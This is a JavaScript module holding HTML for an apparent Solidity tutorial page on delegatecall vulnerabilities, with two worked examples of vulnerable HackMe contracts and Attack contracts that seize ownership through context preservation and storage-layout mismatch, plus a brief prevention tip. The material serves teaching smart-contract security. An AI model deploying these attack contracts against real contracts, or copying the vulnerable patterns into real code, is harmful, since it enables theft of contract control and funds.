// metadata
export const version = "0.8.10"
export const title = "Delegatecall"
export const description = "An example of exploits using delegatecall in Solidity"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p><code>delegatecall</code> is tricky to use and wrong usage or incorrect understanding
can lead to devastating results.</p>
<p>You must keep 2 things in mind when using <code>delegatecall</code></p>
<ol>
<li><code>delegatecall</code> preserves context (storage, caller, etc...)</li>
<li>storage layout must be the same for the contract calling <code>delegatecall</code> and the contract getting called</li>
</ol>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>

<span class="hljs-comment">/*
HackMe is a contract that uses delegatecall to execute code.
It it is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let&#x27;s see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe&#x27;s storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
    Lib <span class="hljs-keyword">public</span> lib;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Lib _lib</span>) </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        lib <span class="hljs-operator">=</span> Lib(_lib);
    }

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">address</span>(lib).<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">data</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> hackMe;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _hackMe</span>) </span>{
        hackMe <span class="hljs-operator">=</span> _hackMe;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        hackMe.<span class="hljs-built_in">call</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"pwn()"</span>));
    }
}
</code></pre>
<p>Here is another example.</p>
<p>You will need to understand how Solidity stores
state variables before you can understand this exploit.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>

<span class="hljs-comment">/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        someNumber <span class="hljs-operator">=</span> _num;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _lib</span>) </span>{
        lib <span class="hljs-operator">=</span> _lib;
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        lib.<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"doSomething(uint256)"</span>, _num));
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-comment">// Make sure the storage layout is the same as HackMe</span>
    <span class="hljs-comment">// This will allow us to correctly update the state variables</span>
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;

    HackMe <span class="hljs-keyword">public</span> hackMe;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">HackMe _hackMe</span>) </span>{
        hackMe <span class="hljs-operator">=</span> HackMe(_hackMe);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-comment">// override address of lib</span>
        hackMe.doSomething(<span class="hljs-keyword">uint</span>(<span class="hljs-keyword">uint160</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))));
        <span class="hljs-comment">// pass any number as input, the function doSomething() below will</span>
        <span class="hljs-comment">// be called</span>
        hackMe.doSomething(<span class="hljs-number">1</span>);
    }

    <span class="hljs-comment">// function signature must match HackMe.doSomething()</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<ul>
<li>Use stateless <code>Library</code></li>
</ul>
`

export default html
